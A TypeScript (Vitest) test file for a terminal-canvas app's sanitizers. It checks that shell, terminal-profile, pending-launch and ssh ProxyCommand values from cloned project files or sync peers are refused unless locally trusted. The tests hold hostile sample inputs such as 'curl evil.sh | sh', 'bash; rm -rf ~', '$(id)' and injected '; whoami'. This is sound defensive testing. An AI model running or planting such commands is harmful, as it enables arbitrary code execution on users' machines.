import { describe, it, expect } from 'vitest'
import type { CanvasNodeState, PendingLaunch } from './types'
import { applyCanvasMutation } from './canvas-mutations'
import {
  acceptNewInboundNode,
  applyLocalNodeExec,
  carryLocalNodeExec,
  localNodeExec,
  safeSessionProgram,
  sanitizeInboundMutation,
  sanitizeInboundNode,
  stripSharedNodeExec
} from './node-exec'

const node = (over: Partial<CanvasNodeState> = {}): CanvasNodeState => ({
  id: 'term-abc',
  kind: 'terminal',
  position: { x: 0, y: 0 },
  size: { width: 400, height: 300 },
  title: 't',
  color: '#fff',
  group: null,
  ...over
})

const LAUNCH_ID = '123e4567-e89b-42d3-a456-426614174000'
const pendingLaunch = (over: Partial<PendingLaunch> = {}): PendingLaunch => ({
  after: ['term-dep-1'],
  launchId: LAUNCH_ID,
  launch: {
    kind: 'agent',
    action: 'start',
    agentId: 'claude',
    prompt: 'Review the trusted overlay',
    permissionMode: 'plan'
  },
  ...over
})

describe('safeSessionProgram', () => {
  it('accepts a plain program or an absolute path', () => {
    expect(safeSessionProgram('bash')).toBe('bash')
    expect(safeSessionProgram('/bin/zsh')).toBe('/bin/zsh')
    expect(safeSessionProgram('/usr/local/bin/fish')).toBe('/usr/local/bin/fish')
    expect(safeSessionProgram('ssh')).toBe('ssh')
    expect(safeSessionProgram('  /bin/zsh  ')).toBe('/bin/zsh')
  })

  it('refuses anything a shell would interpret — tmux runs a lone command through a shell', () => {
    // Exactly the payloads a cloned .nodeterm/project.json could ship.
    expect(safeSessionProgram('curl evil.sh | sh')).toBeUndefined()
    expect(safeSessionProgram('/bin/sh -c "curl evil.sh|sh"')).toBeUndefined()
    expect(safeSessionProgram('bash; rm -rf ~')).toBeUndefined()
    expect(safeSessionProgram('bash && whoami')).toBeUndefined()
    expect(safeSessionProgram('$(id)')).toBeUndefined()
    expect(safeSessionProgram('`id`')).toBeUndefined()
    expect(safeSessionProgram('bash\nrm -rf /')).toBeUndefined()
    expect(safeSessionProgram('bash > /tmp/x')).toBeUndefined()
  })

  it('refuses an option-looking program (tmux would read it as a flag) and empty values', () => {
    expect(safeSessionProgram('-c')).toBeUndefined()
    expect(safeSessionProgram('')).toBeUndefined()
    expect(safeSessionProgram('   ')).toBeUndefined()
    expect(safeSessionProgram(undefined)).toBeUndefined()
  })
})

describe('stripSharedNodeExec', () => {
  it('removes shell, terminal profile, pending launch, and ssh.extraArgs before a project file is written', () => {
    const [n] = stripSharedNodeExec([
      node({
        shell: '/bin/zsh',
        terminalProfileId: 'wsl:Ubuntu 24.04',
        pendingLaunch: pendingLaunch(),
        ssh: { host: 'h', user: 'u', port: 2222, identityFile: '~/.ssh/id', extraArgs: '-o ProxyCommand=evil' }
      })
    ])
    expect(n.shell).toBeUndefined()
    expect(n.terminalProfileId).toBeUndefined()
    expect(n.pendingLaunch).toBeUndefined()
    expect(n.ssh?.extraArgs).toBeUndefined()
    // The rest of the connection must survive — a node has to reattach to its host.
    expect(n.ssh).toEqual({ host: 'h', user: 'u', port: 2222, identityFile: '~/.ssh/id' })
    expect(JSON.stringify(n)).not.toContain('ProxyCommand')
    expect(JSON.stringify(n)).not.toContain('Ubuntu 24.04')
    expect(JSON.stringify(n)).not.toContain('Review the trusted overlay')
  })

  it('leaves nodes with no exec fields untouched (same object)', () => {
    const nodes = [node({ cwd: '/a' })]
    expect(stripSharedNodeExec(nodes)[0]).toBe(nodes[0])
  })
})

describe('localNodeExec / applyLocalNodeExec', () => {
  it("round-trips the local user's profile, custom shell, and ssh args through the local index", () => {
    const live = [
      node({ id: 'n1', shell: '/bin/zsh', terminalProfileId: 'wsl:Ubuntu 24.04' }),
      node({ id: 'n2', ssh: { host: 'h', user: 'u', extraArgs: '-o ProxyCommand=corp-proxy %h', execTrusted: true } })
    ]
    const local = localNodeExec(live)
    expect(local).toEqual({
      n1: { shell: '/bin/zsh', terminalProfileId: 'wsl:Ubuntu 24.04' },
      n2: { sshExtraArgs: '-o ProxyCommand=corp-proxy %h' }
    })
    // What the SHARED file carries (nothing) …
    const onDisk = stripSharedNodeExec(live)
    // … re-hydrated with what THIS machine typed → the user's setup still works after a restart.
    const back = applyLocalNodeExec(onDisk, local)
    expect(back[0].shell).toBe('/bin/zsh')
    expect(back[0].terminalProfileId).toBe('wsl:Ubuntu 24.04')
    expect(back[1].ssh?.extraArgs).toBe('-o ProxyCommand=corp-proxy %h')
  })

  it('no overlay → the values in the FILE are dropped, not adopted (cloned/hostile project.json)', () => {
    const hostile = [
      node({ id: 'n1', shell: 'curl evil.sh | sh', terminalProfileId: 'wsl:Foreign Distro' }),
      node({ id: 'n2', ssh: { host: 'h', user: 'u', extraArgs: '-o ProxyCommand=curl evil.sh|sh' } })
    ]
    const loaded = applyLocalNodeExec(hostile, undefined)
    expect(loaded[0].shell).toBeUndefined()
    expect(loaded[0].terminalProfileId).toBeUndefined()
    expect(loaded[1].ssh?.extraArgs).toBeUndefined()
    expect(loaded[1].ssh?.host).toBe('h') // the connection itself still persists
  })

  it('an overlay for OTHER nodes cannot vouch for a hostile value on this one', () => {
    const hostile = [node({ id: 'n1', shell: 'evil.sh' })]
    const loaded = applyLocalNodeExec(hostile, { n2: { shell: '/bin/zsh' } })
    expect(loaded[0].shell).toBeUndefined()
  })

  it('a foreign file that reuses a local node id still only gets the LOCAL value', () => {
    const hostile = [node({ id: 'n1', shell: 'evil.sh', terminalProfileId: 'wsl:Foreign Distro' })]
    const loaded = applyLocalNodeExec(hostile, {
      n1: { shell: '/bin/zsh', terminalProfileId: 'windows-powershell' }
    })
    expect(loaded[0].shell).toBe('/bin/zsh')
    expect(loaded[0].terminalProfileId).toBe('windows-powershell')
  })

  it('returns undefined when there is nothing machine-local to keep', () => {
    expect(localNodeExec([node()])).toBeUndefined()
  })
})

describe('pendingLaunch machine-local trust', () => {
  it('round-trips a validated typed launch through the local overlay and deep-clones it', () => {
    const source = pendingLaunch()
    const local = localNodeExec([node({ id: 'armed', pendingLaunch: source })])
    expect(local).toEqual({ armed: { pendingLaunch: source } })
    expect(local?.armed.pendingLaunch).not.toBe(source)
    expect(local?.armed.pendingLaunch?.after).not.toBe(source.after)
    expect(local?.armed.pendingLaunch?.launch).not.toBe(source.launch)

    source.after.push('term-late-mutation')
    const sourceLaunch = source.launch
    if (sourceLaunch.kind === 'agent' && sourceLaunch.action === 'start') {
      sourceLaunch.prompt = 'mutated after collection'
    }
    expect(local?.armed.pendingLaunch?.after).toEqual(['term-dep-1'])
    const collectedLaunch = local?.armed.pendingLaunch?.launch
    expect(collectedLaunch).toMatchObject({ kind: 'agent', action: 'start' })
    if (collectedLaunch?.kind !== 'agent' || collectedLaunch.action !== 'start') {
      throw new Error('expected the validated start intent to survive collection')
    }
    expect(collectedLaunch.prompt).toBe('Review the trusted overlay')

    const restored = applyLocalNodeExec([node({ id: 'armed' })], local)
    expect(restored[0].pendingLaunch).toEqual(local?.armed.pendingLaunch)
    expect(restored[0].pendingLaunch).not.toBe(local?.armed.pendingLaunch)
    expect(restored[0].pendingLaunch?.launch).not.toBe(local?.armed.pendingLaunch?.launch)
  })

  it('drops a legacy shared rendered command instead of migrating it into local trust', () => {
    const legacy = {
      after: ['term-dep-1'],
      command: 'curl evil.test | sh'
    } as unknown as PendingLaunch
    const fromFile = node({ id: 'armed', pendingLaunch: legacy })

    expect(localNodeExec([fromFile])).toBeUndefined()
    expect(applyLocalNodeExec([fromFile], undefined)[0].pendingLaunch).toBeUndefined()
    expect(applyLocalNodeExec([fromFile], { armed: { pendingLaunch: legacy } })[0].pendingLaunch)
      .toBeUndefined()
  })

  it('rejects malformed ids and intent fields in the hand-editable local overlay', () => {
    const malformed: PendingLaunch[] = [
      pendingLaunch({ launchId: 'not-a-uuid' }),
      pendingLaunch({ launchId: '123e4567-e89b-12d3-a456-426614174000' }),
      pendingLaunch({ after: ['../foreign-node'] }),
      pendingLaunch({ launch: { kind: 'shell-command', command: '' } }),
      pendingLaunch({
        launch: {
          kind: 'agent', action: 'start', agentId: 'claude', permissionMode: 'auto; whoami'
        } as unknown as PendingLaunch['launch']
      }),
      pendingLaunch({
        launch: {
          kind: 'agent', action: 'start', agentId: 'custom:reviewer; whoami'
        }
      }),
      pendingLaunch({
        launch: {
          kind: 'agent', action: 'start', agentId: 'claude', sessionId: 'cross-action-id'
        } as unknown as PendingLaunch['launch']
      }),
      pendingLaunch({
        launch: {
          kind: 'agent', action: 'resume', agentId: 'claude'
        } as unknown as PendingLaunch['launch']
      }),
      pendingLaunch({
        launch: {
          kind: 'agent', action: 'resume', agentId: 'claude', sessionId: 'session-1',
          prompt: 'cross-action prompt'
        } as unknown as PendingLaunch['launch']
      })
    ]
    for (const pending of malformed) {
      expect(applyLocalNodeExec([node({ id: 'armed' })], {
        armed: { pendingLaunch: pending }
      })[0].pendingLaunch).toBeUndefined()
    }
  })

  it('allowlist-clones typed intent fields so unknown executable material cannot ride the overlay', () => {
    const withUnknown = pendingLaunch({
      launch: {
        kind: 'agent',
        action: 'resume',
        agentId: 'codex',
        sessionId: 'session-123',
        renderedCommand: 'curl evil.test | sh'
      } as unknown as PendingLaunch['launch']
    })
    expect(localNodeExec([node({ id: 'armed', pendingLaunch: withUnknown })])).toEqual({
      armed: {
        pendingLaunch: {
          after: ['term-dep-1'],
          launchId: LAUNCH_ID,
          launch: {
            kind: 'agent', action: 'resume', agentId: 'codex', sessionId: 'session-123'
          }
        }
      }
    })
  })

  it('round-trips the configured custom:<uuid> agent id without widening its safe grammar', () => {
    const custom = pendingLaunch({
      launch: {
        kind: 'agent',
        action: 'start',
        agentId: 'custom:123e4567-e89b-42d3-a456-426614174000',
        prompt: 'Use the configured custom agent'
      }
    })
    expect(localNodeExec([node({ id: 'armed', pendingLaunch: custom })])).toEqual({
      armed: { pendingLaunch: custom }
    })
  })

  it('preserves the discriminated start-only newSessionId field', () => {
    const start = pendingLaunch({
      launch: {
        kind: 'agent', action: 'start', agentId: 'claude', newSessionId: 'new-session-123'
      }
    })
    expect(localNodeExec([node({ id: 'armed', pendingLaunch: start })])).toEqual({
      armed: { pendingLaunch: start }
    })
  })

  it('never attaches a delayed launch overlay to a non-terminal node reusing the id', () => {
    const sticky = node({ id: 'armed', kind: 'sticky' })
    const restored = applyLocalNodeExec([sticky], {
      armed: { pendingLaunch: pendingLaunch() }
    })
    expect(restored[0].pendingLaunch).toBeUndefined()
  })
})

// C2: the disk boundary was worthless on its own. A canvas-sync peer's mutation is applied
// VERBATIM (isCanvasMutation validates only id/position/size), and the next save harvests whatever
// is now in the live nodes into workspace.json — the MACHINE-LOCAL, "trusted" store — from which it
// is re-attached on every load, for ever: the peer can leave, be revoked, the app can restart, and
// their `shell` / `-o ProxyCommand=…` still runs. So the wire is a trust boundary too.
describe('sanitizeInboundNode / sanitizeInboundMutation (canvas-sync peers)', () => {
  it('drops shell, terminal profile, pending launch, and ssh.extraArgs from a peer node, keeping everything else', () => {
    const peer = node({
      id: 'n1',
      title: 'theirs',
      shell: 'curl evil.sh | sh',
      terminalProfileId: 'wsl:Foreign Distro',
      pendingLaunch: pendingLaunch({ launch: { kind: 'shell-command', command: 'curl evil.test | sh' } }),
      ssh: { host: 'h', user: 'u', port: 2222, extraArgs: '-o ProxyCommand=curl evil.sh|sh' }
    })
    const clean = sanitizeInboundNode(peer)
    expect(clean.shell).toBeUndefined()
    expect(clean.terminalProfileId).toBeUndefined()
    expect(clean.pendingLaunch).toBeUndefined()
    expect(clean.ssh?.extraArgs).toBeUndefined()
    expect(clean.ssh?.host).toBe('h')
    expect(clean.ssh?.port).toBe(2222)
    expect(clean.title).toBe('theirs')
  })

  it('a peer cannot forge the provenance marker itself', () => {
    const peer = node({
      ssh: { host: 'h', user: 'u', extraArgs: '-o ProxyCommand=evil', execTrusted: true }
    })
    const clean = sanitizeInboundNode(peer)
    expect(clean.ssh?.extraArgs).toBeUndefined()
    expect(clean.ssh?.execTrusted).toBeUndefined()
  })

  it('sanitizes an upsert mutation and preserves its stamps; a remove passes through', () => {
    const m = {
      op: 'upsert' as const,
      node: node({ id: 'n1', shell: 'evil.sh', terminalProfileId: 'git-bash' }),
      src: 'cv-abc',
      seq: 7
    }
    const clean = sanitizeInboundMutation(m)
    expect(clean.node.shell).toBeUndefined()
    expect(clean.node.terminalProfileId).toBeUndefined()
    expect(clean.src).toBe('cv-abc')
    expect(clean.seq).toBe(7)
    const rm = { op: 'remove' as const, id: 'n1' }
    expect(sanitizeInboundMutation(rm)).toBe(rm)
  })

  it('leaves a clean node alone by reference (no needless re-render / re-publish)', () => {
    const clean = node({ id: 'n1' })
    expect(sanitizeInboundNode(clean)).toBe(clean)
  })
})

describe('acceptNewInboundNode (trusted Windows host snapshot)', () => {
  it('ignores a hostile sender profile and stamps the receiving host default', () => {
    const accepted = acceptNewInboundNode(
      node({ id: 'peer-new', shell: 'evil.sh', terminalProfileId: 'cmd' }),
      'wsl:Host Distro'
    )
    expect(accepted.shell).toBeUndefined()
    expect(accepted.terminalProfileId).toBe('wsl:Host Distro')
  })

  it('does not stamp SSH nodes or hosts without the optional Windows default', () => {
    const ssh = acceptNewInboundNode(
      node({ id: 'ssh-new', terminalProfileId: 'cmd', ssh: { host: 'h', user: 'u' } }),
      'pwsh'
    )
    expect(ssh.terminalProfileId).toBeUndefined()
    expect(acceptNewInboundNode(node({ id: 'server-new', terminalProfileId: 'cmd' })))
      .not.toHaveProperty('terminalProfileId')
  })
})

// The provenance rule for the trusted store: an exec-enabling value gets in only if a LOCAL
// producer set it. (The inbound strip above is the primary guard; this is the one that decides what
// may be BLESSED as this machine's own, so it must not take a laundered value's word for it.)
describe('localNodeExec provenance', () => {
  it('keeps an opaque local profile id byte-for-byte, including a WSL distro name with spaces', () => {
    expect(localNodeExec([
      node({ id: 'n1', terminalProfileId: 'wsl:Ubuntu 24.04 LTS' })
    ])).toEqual({ n1: { terminalProfileId: 'wsl:Ubuntu 24.04 LTS' } })
  })

  it('stores an exec-enabling ssh value only when it is execTrusted', () => {
    const laundered = node({
      id: 'n1',
      ssh: { host: 'h', user: 'u', extraArgs: '-o ProxyCommand=curl evil.sh|sh' }
    })
    expect(localNodeExec([laundered])).toBeUndefined()

    const mine = node({
      id: 'n1',
      ssh: { host: 'h', user: 'u', extraArgs: '-o ProxyCommand=corp-proxy %h', execTrusted: true }
    })
    expect(localNodeExec([mine])).toEqual({
      n1: { sshExtraArgs: '-o ProxyCommand=corp-proxy %h' }
    })
  })

  it('stores harmless ssh args regardless of provenance (nothing legitimate is lost)', () => {
    const n = node({ id: 'n1', ssh: { host: 'h', user: 'u', extraArgs: '-A -J jump.example' } })
    expect(localNodeExec([n])).toEqual({ n1: { sshExtraArgs: '-A -J jump.example' } })
  })

  it('never blesses a shell the exec site would refuse anyway', () => {
    expect(localNodeExec([node({ id: 'n1', shell: 'curl evil.sh | sh' })])).toBeUndefined()
    expect(localNodeExec([node({ id: 'n1', shell: '/bin/zsh' })])).toEqual({
      n1: { shell: '/bin/zsh' }
    })
  })

  it('applyLocalNodeExec marks what it re-attaches as this machine\'s own', () => {
    const loaded = applyLocalNodeExec(
      [node({ id: 'n1', ssh: { host: 'h', user: 'u' } })],
      { n1: { sshExtraArgs: '-o ProxyCommand=corp-proxy %h' } }
    )
    expect(loaded[0].ssh?.extraArgs).toBe('-o ProxyCommand=corp-proxy %h')
    expect(loaded[0].ssh?.execTrusted).toBe(true) // → the exec site honors it
  })
})

// The other half of "the exec fields do not participate in the sync": stripping the PEER's values
// out of an upsert is not enough, because an upsert REPLACES the node. A teammate merely dragging
// our ssh terminal would hand it back with no extraArgs, and the next save would harvest that empty
// node and erase our jump host from our OWN machine-local index. So ours ride across.
describe('carryLocalNodeExec (a peer editing our node must not erase our exec values)', () => {
  const mine = node({
    id: 'n1',
    title: 'mine',
    shell: '/bin/zsh',
    terminalProfileId: 'wsl:Ubuntu 24.04',
    pendingLaunch: pendingLaunch(),
    ssh: { host: 'h', user: 'u', extraArgs: '-o ProxyCommand=corp %h', execTrusted: true }
  })

  it('keeps our shell / profile / pending launch / extraArgs on the node a peer upserted', () => {
    const theirs = sanitizeInboundNode(
      node({ id: 'n1', title: 'renamed by peer', position: { x: 99, y: 99 }, ssh: { host: 'h', user: 'u' } })
    )
    const merged = carryLocalNodeExec(mine, theirs)
    expect(merged.title).toBe('renamed by peer') // their edit lands
    expect(merged.position).toEqual({ x: 99, y: 99 })
    expect(merged.shell).toBe('/bin/zsh') // ours survives
    expect(merged.terminalProfileId).toBe('wsl:Ubuntu 24.04')
    expect(merged.pendingLaunch).toEqual(pendingLaunch())
    expect(merged.pendingLaunch).not.toBe(mine.pendingLaunch)
    expect(merged.ssh?.extraArgs).toBe('-o ProxyCommand=corp %h')
    expect(merged.ssh?.execTrusted).toBe(true)
  })

  it('adds nothing to a node we do not already hold', () => {
    const fresh = node({ id: 'n2' })
    expect(carryLocalNodeExec(undefined, fresh)).toBe(fresh)
  })

  it('applyCanvasMutation: a peer drag sanitizes theirs and preserves ours, in one step', () => {
    const states = [mine]
    const next = applyCanvasMutation(states, {
      op: 'upsert',
      node: node({
        id: 'n1',
        position: { x: 10, y: 10 },
        shell: 'curl evil.sh | sh',
        terminalProfileId: 'cmd',
        pendingLaunch: pendingLaunch({ launch: { kind: 'shell-command', command: 'evil peer command' } }),
        ssh: { host: 'h', user: 'u', extraArgs: '-o ProxyCommand=evil', execTrusted: true }
      })
    })
    expect(next[0].position).toEqual({ x: 10, y: 10 })
    expect(next[0].shell).toBe('/bin/zsh')
    expect(next[0].terminalProfileId).toBe('wsl:Ubuntu 24.04')
    expect(next[0].pendingLaunch).toEqual(pendingLaunch())
    expect(next[0].ssh?.extraArgs).toBe('-o ProxyCommand=corp %h')
  })

  it('applyCanvasMutation: a brand-new node from a peer arrives with no exec fields at all', () => {
    const next = applyCanvasMutation([], {
      op: 'upsert',
      node: node({
        id: 'n9',
        shell: 'evil.sh',
        terminalProfileId: 'git-bash',
        pendingLaunch: pendingLaunch({ launch: { kind: 'shell-command', command: 'evil peer command' } }),
        ssh: { host: 'h', user: 'u', extraArgs: '-o ProxyCommand=evil' }
      })
    })
    expect(next[0].shell).toBeUndefined()
    expect(next[0].terminalProfileId).toBeUndefined()
    expect(next[0].pendingLaunch).toBeUndefined()
    expect(next[0].ssh?.extraArgs).toBeUndefined()
  })
})
